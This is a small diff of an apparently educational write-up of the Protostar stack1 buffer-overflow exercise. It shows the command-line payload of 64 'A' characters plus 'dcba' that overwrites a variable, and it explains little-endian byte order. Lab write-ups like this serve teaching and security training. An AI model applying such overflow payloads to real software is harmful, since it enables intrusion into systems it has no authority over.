@@ -109,6 +109,5 @@ Program exited with code 036.
 ```
 user@protostar:/opt/protostar/bin$ ./stack1 $(python -c "print 'A'*64 + 'dcba'")
 you have correctly got the variable to the right value
-user@protostar:/opt/protostar/bin$ 
 ```
 We correctly changed the value of **modified** variable and keep in mind to pass the value in **LITTLE ENDIAN**. The string "dcba" will be stored in reverse in little endian and in hex values.
